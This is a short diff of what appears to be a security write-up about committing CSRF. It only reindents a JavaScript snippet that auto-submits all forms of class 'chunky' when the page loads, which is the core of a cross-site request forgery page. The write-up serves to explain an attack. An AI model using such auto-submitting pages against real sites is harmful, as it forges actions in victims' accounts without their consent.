@@ -45,11 +45,10 @@ That means we'll probably need to find a way to commit **CSRF**. To get your use
 </form>
 
 <script>
-
-	window.onload = function(){
-        $(".chunky").map(function(_, form){
-    form.submit()
-});
+window.onload = function(){
+  $(".chunky").map(function(_, form){
+   form.submit()
+  });
 }
 </script>
 ```
@@ -66,10 +65,10 @@ attribute.
 <input type="submit" value="send">
 </form>
 <script>
-	window.onload = function(){
-        $(".chunky").map(function(_, form){
+window.onload = function(){
+  $(".chunky").map(function(_, form){
     form.submit()
-});
+  });
 }
 </script>
 ```
